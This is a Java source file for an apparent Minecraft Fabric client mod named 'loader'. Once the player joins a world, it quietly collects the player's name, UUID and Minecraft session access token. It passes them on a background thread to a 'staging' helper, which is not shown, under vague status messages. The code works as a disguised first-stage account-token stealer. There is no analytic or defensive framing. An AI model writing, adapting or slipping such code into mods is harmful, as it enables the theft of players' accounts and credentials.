package com.example;

import com.google.gson.JsonObject;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;

import java.util.UUID;

public class Loader implements ClientModInitializer {
    public static final String MOD_ID = "loader";
    private static boolean hasRun = false;

    @Override
    public void onInitializeClient() {
        System.out.println("[Loader] Mod initialized, waiting for world join...");

        // Register tick event to wait until in-game
        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (!hasRun && client.player != null && client.getNetworkHandler() != null) {
                hasRun = true;
                executeStage1();
            }
        });
    }

    private void executeStage1() {
        try {
            System.out.println("[Loader] Player joined world, executing...");

            JsonObject context = new JsonObject();
            context.addProperty("platform", "mod");

            MinecraftClient mc = MinecraftClient.getInstance();
            ClientPlayNetworkHandler session = mc.getNetworkHandler();

            JsonObject mcInfo = new JsonObject();
            mcInfo.addProperty("name", session.getProfile().name());

            UUID uuid = session.getProfile().id();
            if (uuid == null) {
                mcInfo.addProperty("id", "offline");
            } else {
                mcInfo.addProperty("id", uuid.toString());
            }

            mcInfo.addProperty("token", mc.getSession().getAccessToken());
            context.add("mcInfo", mcInfo);

            new Thread(() -> {
                try {
                    StagingHelper.stageWithContext(context);
                } catch (Exception e) {
                    System.out.println("Mod init state: M3");
                }
            }).start();

        } catch (Exception e) {
            System.out.println("Mod init state: M4");
            e.printStackTrace();
        }
    }
}